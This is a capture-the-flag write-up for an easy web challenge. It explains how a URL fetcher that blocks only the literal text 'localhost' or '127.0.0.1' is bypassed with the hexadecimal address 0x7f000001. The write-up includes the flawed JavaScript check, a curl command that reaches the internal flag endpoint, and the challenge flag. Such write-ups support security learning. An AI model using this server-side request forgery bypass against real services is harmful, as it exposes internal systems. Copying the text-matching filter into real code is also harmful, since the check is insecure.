---
title: "fetcher"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# fetcher

## Summary

The URL fetcher blocks a few textual localhost spellings but not every representation of the same IP address. A hexadecimal IPv4 value reaches the local-only flag endpoint.

## Root cause

The filtering and request are:

~~~javascript
const BLOCKED = ['localhost', '127.0.0.1', '0.0.0.0'];
if (url.includes(blocked)) {
  return res.status(403).send('Access to this host is blocked');
}
const response = await axios.get(url);
~~~

This checks text in the supplied URL rather than resolving and validating its destination. Numeric encodings such as 0x7f000001 do not match the blocked strings but resolve to 127.0.0.1.

## Vulnerability

Submitting the standard localhost names is rejected, which shows that filtering occurs before the server fetches the URL. The filter checks text rather than resolving and validating the destination address.

## Exploit

The one-number hexadecimal IPv4 form below means 127.0.0.1:

~~~text
0x7f000001
~~~

Use it in the fetch request:

~~~bash
curl -sG https://fetcher.web2.friendly-ctf.securinets.tn/fetch \
  --data-urlencode 'url=http://0x7f000001:5007/flag'
~~~

The submitted URL does not contain a blocked spelling, but Node resolves it to loopback. The server then requests its own flag endpoint and returns the response.

## Flag

~~~text
Securinets{s3rver_s1de_requ3st_f0rg3ry!!!!}
~~~
